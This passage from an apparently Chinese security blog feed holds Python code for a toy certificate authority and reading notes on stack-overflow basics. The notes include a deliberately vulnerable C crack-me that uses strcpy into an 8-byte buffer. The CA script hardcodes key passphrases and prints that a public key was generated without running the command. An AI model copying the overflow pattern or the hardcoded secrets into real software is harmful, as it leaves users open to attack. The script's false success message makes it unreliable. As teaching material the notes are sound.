class="hljs-string">"\033[32m[+]\033[0m自签名证书生成完成"</span>)<br><br><br><span class="hljs-comment"># 为申请者生成证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Sign_Cert</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_socket:<br>        CA_socket.bind((<span class="hljs-string">"0.0.0.0"</span>, CA_port))<br>        CA_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m等待客户端连接...'</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m自<span class="hljs-subst">{addr[<span class="hljs-number">0</span>]}</span>的申请者已连接'</span>)<br><br>            <span class="hljs-comment"># 生成证书号</span><br>            <span class="hljs-keyword">global</span> cert_num<br>            sig = <span class="hljs-string">f'<span class="hljs-subst">{addr[<span class="hljs-number">0</span>].replace(<span class="hljs-string">"."</span>, <span class="hljs-string">""</span>)}</span>_<span class="hljs-subst">{addr[<span class="hljs-number">1</span>]}</span>_<span class="hljs-subst">{cert_num}</span>'</span><br>            cert_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">with</span> conn:<br>                conn.settimeout(<span class="hljs-number">2</span>)<br>                csr_data = <span class="hljs-string">b''</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    <span class="hljs-keyword">try</span>:<br>                        data = conn.recv(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                            <span class="hljs-keyword">break</span><br>                        csr_data += data<br>                        <span class="hljs-keyword">pass</span><br>                    <span class="hljs-keyword">except</span> socket.timeout:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-comment"># 生成 req.csr 文件</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'req_<span class="hljs-subst">{sig}</span>.csr'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>                    csr_file.write(csr_data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m申请文件CSR接收成功'</span>)<br>                <span class="hljs-comment"># 在这里处理证书请求文件的数据</span><br>                command = [<br>                    <span class="hljs-string">'openssl'</span>, <span class="hljs-string">'x509'</span>,<br>                    <span class="hljs-string">'-req'</span>, <span class="hljs-string">'-CA'</span>, <span class="hljs-string">'./rootCA.crt'</span>,<br>                    <span class="hljs-string">'-CAkey'</span>, <span class="hljs-string">'rootCA.key'</span>,<br>                    <span class="hljs-string">'-CAcreateserial'</span>,<br>                    <span class="hljs-string">'-in'</span>, <span class="hljs-string">f'./req_<span class="hljs-subst">{sig}</span>.csr'</span>,<br>                    <span class="hljs-string">'-passin'</span>, <span class="hljs-string">'pass:3xsh0re'</span>,<br>                    <span class="hljs-string">'-out'</span>, <span class="hljs-string">f'./req_<span class="hljs-subst">{sig}</span>.crt'</span>,<br>                    <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span><br>                ]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]\033[0m正在查验申请者资质......"</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]\033[0m打印签发信息:"</span>)<br>                <span class="hljs-keyword">try</span>:<br>                    subprocess.run(command, stdout=subprocess.DEVNULL)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\033[32m[+]\033[0m来自<span class="hljs-subst">{addr[<span class="hljs-number">0</span>]}</span>的申请者的证书签署完成"</span>)<br>                <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]当前系统没有安装OpenSSL库\033[0m"</span>)<br><br>                <span class="hljs-comment"># 传送CRT</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./req_<span class="hljs-subst">{sig}</span>.crt'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        data = file.read(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                            conn.sendall(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m证书发送完成!'</span>)<br>                conn.close()<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m本次签发结束!\n-------------------------------------------------------'</span>)<br><br><br><span class="hljs-comment"># CA提供根证书下载</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Download_rootCA</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_Download_socket:<br>        CA_Download_socket.bind((<span class="hljs-string">"0.0.0.0"</span>, CA_download_port))<br>        CA_Download_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]rootCA下载端口开放中...\033[0m'</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_Download_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m自<span class="hljs-subst">{addr[<span class="hljs-number">0</span>]}</span>的下载者已连接'</span>)<br>            <span class="hljs-comment"># 传送rootCA.crt</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./rootCA.crt'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    conn.settimeout(<span class="hljs-number">2</span>)<br>                    data = file.read(<span class="hljs-number">1024</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                        conn.sendall(data)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mrootCA.crt发送完成!\n---------------------------------------------------'</span>)<br>            conn.close()<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># Client请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Request_Cert</span>(<span class="hljs-params">username, passwd</span>):<br>    <span class="hljs-comment"># 生成私钥</span><br>    command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'genrsa'</span>, <span class="hljs-string">'-des3'</span>, <span class="hljs-string">'-passout'</span>, <span class="hljs-string">f'pass:<span class="hljs-subst">{passwd}</span>'</span>, <span class="hljs-string">'-out'</span>, <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.key'</span>, <span class="hljs-string">'2048'</span>]<br>    subprocess.run(command)<br>    <span class="hljs-comment"># 生成证书请求文件CSR</span><br>    subject_info = <span class="hljs-string">f"/C=CN/ST=Beijing/L=Haidian/O=USTB_<span class="hljs-subst">{username}</span>/OU=USTBer/CN=Client_<span class="hljs-subst">{username}</span>"</span><br>    command2 = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'req'</span>, <span class="hljs-string">'-new'</span>, <span class="hljs-string">'-key'</span>, <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.key'</span>, <span class="hljs-string">'-passin'</span>, <span class="hljs-string">f'pass:<span class="hljs-subst">{passwd}</span>'</span>, <span class="hljs-string">'-out'</span>,<br>                <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.csr'</span>, <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span>, <span class="hljs-string">'-subj'</span>, subject_info]<br>    subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m已连接至CA服务器'</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m正在向CA发送签发请求.....'</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./<span class="hljs-subst">{username}</span>_req.csr'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mCSR文件发送完成!\n'</span><br>              <span class="hljs-string">'\033[32m[+]\033[0m正在等待CA签发......'</span>)<br><br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m证书<span class="hljs-subst">{username}</span>_req.crt制作完成,可在当前文件夹下查看'</span>)<br><br><br><span class="hljs-comment"># Client验证证书,若验证通过则在当前文件夹下生成服务端公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Verify</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'rootCA.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看'</span>)<br>        verify_command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'verify'</span>, <span class="hljs-string">'-CAfile'</span>, <span class="hljs-string">'./rootCA.crt'</span>, <span class="hljs-string">f'Server_req.crt'</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"OK"</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]服务器证书验证成功!\033[0m"</span>)<br>            gen_server_pk_command = [<span class="hljs-string">'openssl x509 -in Server_req.crt -pubkey -noout &gt; server_pk.pem'</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]已经在当前文件夹下生成服务端公钥server_pk.pem!\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]验证失败！！！\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># Server请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Request_Cert</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 生成私钥</span><br>        command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'genrsa'</span>, <span class="hljs-string">'-des3'</span>, <span class="hljs-string">'-passout'</span>, <span class="hljs-string">f'pass:USTBServer'</span>, <span class="hljs-string">'-out'</span>, <span class="hljs-string">f'Server_req.key'</span>, <span class="hljs-string">'2048'</span>]<br>        subprocess.run(command, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-comment"># 生成证书请求文件CSR</span><br>        subject_info = <span class="hljs-string">f"/C=CN/ST=Beijing/L=Haidian/O=USTB_Server/OU=Server/CN=USTB_Server"</span><br>        command2 = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'req'</span>, <span class="hljs-string">'-new'</span>, <span class="hljs-string">'-key'</span>, <span class="hljs-string">f'Server_req.key'</span>, <span class="hljs-string">'-passin'</span>, <span class="hljs-string">f'pass:USTBServer'</span>, <span class="hljs-string">'-out'</span>,<br>                    <span class="hljs-string">f'Server_req.csr'</span>, <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span>, <span class="hljs-string">'-subj'</span>, subject_info]<br>        subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mCSR文件生成成功!'</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]私钥生成失败!!!\033[0m"</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]查看当前系统是否安装OpenSSL库!!!\033[0m"</span>)<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m已连接至CA服务器'</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0m正在向CA发送签发请求.....'</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'./Server_req.csr'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[32m[+]\033[0mCSR文件发送完成!\n'</span><br>              <span class="hljs-string">'\033[32m[+]\033[0m正在等待CA签发......'</span>)<br><br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'Server_req.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0m证书Server_req.crt制作完成,可在当前文件夹下查看'</span>)<br><br><span class="hljs-comment"># Server 请求验证客户端证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Verify</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b''</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'rootCA.crt'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看'</span>)<br>        verify_command = [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'verify'</span>, <span class="hljs-string">'-CAfile'</span>, <span class="hljs-string">'./rootCA.crt'</span>, <span class="hljs-string">f'<span class="hljs-subst">{username}</span>_req.crt'</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"OK"</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]目标客户端证书验证成功!\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[31m[-]验证失败！！！\033[0m"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CA</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'\033[34m _   _ ____ _____ ____     ____    _    \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m| | | / ___|_   _| __ )   / ___|  / \   \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m| | | \___ \ | | |  _ \  | |     / _ \  \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m| |_| |___) || | | |_) | | |___ / ___ \ \033[0m\n'</span><br>          <span class="hljs-string">'\033[34m\___/ |____/ |_| |____/___\____/_/   \_\ \033[0m\n'</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\t\t\t\t\033[34m-------created by 3xsh0re\033[0m"</span>)<br>    root_ca_file = Path(<span class="hljs-string">"rootCA.crt"</span>)<br>    <span class="hljs-keyword">if</span> root_ca_file.is_file():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\033[32m[+]rootCA.crt已经生成\033[0m"</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 生成根证书</span><br>        Gen_rootCA()<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># 提交线程1的执行</span><br>        thread1 = executor.submit(Download_rootCA)<br>        <span class="hljs-comment"># 提交线程2的执行</span><br>        thread2 = executor.submit(Sign_Cert)<br>        <span class="hljs-comment"># 等待两个线程执行完成</span><br>        concurrent.futures.wait([thread1, thread2])<br><br><br><span class="hljs-comment"># Client端请求CA颁发证书</span><br>Client_Request_Cert(<span class="hljs-string">"3xsh0re"</span>, <span class="hljs-string">"123456"</span>)<br><span class="hljs-comment"># 用户验证Server</span><br><span class="hljs-comment"># Client_Verify()</span><br><br><span class="hljs-comment"># Server端请求CA颁发证书</span><br><span class="hljs-comment"># Server_Request_Cert()</span><br><span class="hljs-comment"># Server验证用户ZZR</span><br>Server_Verify(<span class="hljs-string">"3xsh0re"</span>)<br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-comment"># CA()</span><br></code></pre></td></tr></table></figure><p>下面是笔者和几个小伙伴用数字认证原理改造的一个Python聊天室项目</p><p><a href="https://github.com/REMIXXYH/ChatRoom">基于CA和SSL改造的ChatRoom</a></p><p>关于SSL/TLS我后来写了更详细的分析，<a href="https://3xsh0re.github.io/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/">点击跳转</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字认证技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔2</title>
    <link href="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/"/>
    <url>/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔2"><a href="#0Day安全软件漏洞分析第2版阅读随笔2" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔2"></a>0Day安全软件漏洞分析第2版阅读随笔2</h1><p>开启第二章的阅读，栈溢出基本原理！</p><p>程序中所使用的缓冲区可以是堆区、栈区和存放静态变量的数据区。本章主要介绍在系统栈中发生溢出的情形。</p><p>Impossible-&gt;I’m possible😎</p><span id="more"></span><h2 id="第二章-栈溢出原理与实践"><a href="#第二章-栈溢出原理与实践" class="headerlink" title="第二章-栈溢出原理与实践"></a>第二章-栈溢出原理与实践</h2><h3 id="系统栈的工作原理"><a href="#系统栈的工作原理" class="headerlink" title="系统栈的工作原理"></a>系统栈的工作原理</h3><h4 id="操作系统的内存"><a href="#操作系统的内存" class="headerlink" title="操作系统的内存"></a>操作系统的内存</h4><p>进程使用内存可以按照功能可以非常简单地分为以下4个部分（实际上的内存远没有这么简单）：</p><ul><li><p>代码区：<strong>存放二进制机器码</strong>，CPU在此处取指并执行。PE文件的代码段中包含的二进制机器码会被装入内存的代码区（.text）</p></li><li><p>数据区：存放<strong>全局变量</strong></p></li><li><p>堆区：进程可以在堆区动态地请求一定大小的内存，用完后还给堆区。<strong>动态分配和回收是堆区的特点</strong>。</p></li><li><p>栈区：用于动态存储函数之间的调用关系，以保证被调函数在返回时恢复到母函数中继续执行。</p></li></ul><h4 id="系统栈、函数栈帧"><a href="#系统栈、函数栈帧" class="headerlink" title="系统栈、函数栈帧"></a>系统栈、函数栈帧</h4><p>​首先栈是一种数据结构，这个肯定都知道啦🤣两种操作，PUSH和POP，存在栈顶TOP和栈底BASE，一般来说，TOP是动态的，BASE是静态的。</p><p>​内存中的栈区实际上就是系统栈，是系统实现的一种管理函数调用的数据结构，由系统自动维护。</p><p>​不同的操作系统在函数调用的规定上是不同的，如果要明确使用某一种调用约定，需要在函数前加上调用约定的声明。默认情况下，采用<code>_stdcall</code>这种方式。</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_10-13-07.png" class=""><p>​而函数的调用就是通过系统栈的来实现的，当一个新的函数被调用时，会为其开辟一个新的栈帧，OS会进行以下操作：</p><ol><li>按规定顺序压入函数参数</li><li>压入返回地址，一般为函数调用指令的地址</li><li>此时CPU开始读取新的代码区的指令</li><li>压入当前栈帧的栈底指针值（EBP）</li><li>EBP&lt;=ESP，此时EBP指向的内存位置存储的是源函数的栈底指针值</li><li>ESP=ESP-所需空间</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH arg3;<br>PUSH arg2;<br>PUSH arg1;<br>CALL func; //此时压入返回地址，代码区转换<br>PUSH EBP;<br>MOV  EBP,ESP;<br>SUB  ESP,EBX;//假设EBX为需要的内存大小,静态变量使用内存大小的确定在编译器编译时就已经确定了<br></code></pre></td></tr></table></figure><p>当函数调用完成时，</p><ol><li>返回值存放在EAX寄存器</li><li>ESP=ESP+占用内存大小</li><li>EBP=(EBP)</li><li>函数返回值addr弹回，EIP=addr</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADD  ESP,EBX;<br>MOV  EBP,(EBP);<br>POP  EBP;<br>RETN; <br></code></pre></td></tr></table></figure><p><a href="https://gitbook.coder.cat/function-call-principle/content/storage-of-local-variables.html">关于局部变量的存储</a>，这里书里没有讲，寄存器和内存都可以用来存放<code>函数执行时</code>所需的<code>数据</code>。寄存器的存取速度比内存快很多，所以通常会优先把数据存入寄存器中。但是由于寄存器数量有限，因此当寄存器不够用时会将数据存放在栈内存中。</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_11-14-28.png" class=""><h3 id="修改临界变量"><a href="#修改临界变量" class="headerlink" title="修改临界变量"></a>修改临界变量</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在系统栈中存在某一种可能的情况，局部变量紧挨着排列，当局部变量中存在数组之类的缓冲区时，并且在赋值时数组可以发生越界，那么越界的数组元素可能破坏相邻变量的值，甚至当紧挨着<code>EBP</code>时，从而修改<code>EBP</code>、返回地址等等。</p><h4 id="crack-me2"><a href="#crack-me2" class="headerlink" title="crack_me2"></a>crack_me2</h4><p>人为制造溢出：</p><p>注意<code>buffer</code>的声明位置</p><p>我们的目标是溢出到返回值，让其返回1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"3xsh0re"</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG     <span class="hljs-string">"flag{stack_overflow_right?}"</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>];<span class="hljs-comment">// add local buffto be overflowed </span><br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    { <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"please input password: "</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n\n"</span>); <br>        } <br>   <span class="hljs-keyword">else</span> <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have got the flag:%s\n"</span>,FLAG); <br>            <span class="hljs-keyword">break</span>; <br>        } <br>    } <br>} <br></code></pre></td></tr></table></figure><p>此时笔者转去学习<code>x64dbg</code>了，不然用起来很不顺手🤣，如果需要了解简单的用法，见上一篇博客</p><p>浅浅学习归来，</p><p>首先将程序拖进<code>x64dbg</code>，然后寻找验证函数的位置，在此模块搜索字符串，然后定位到大致位置</p><img 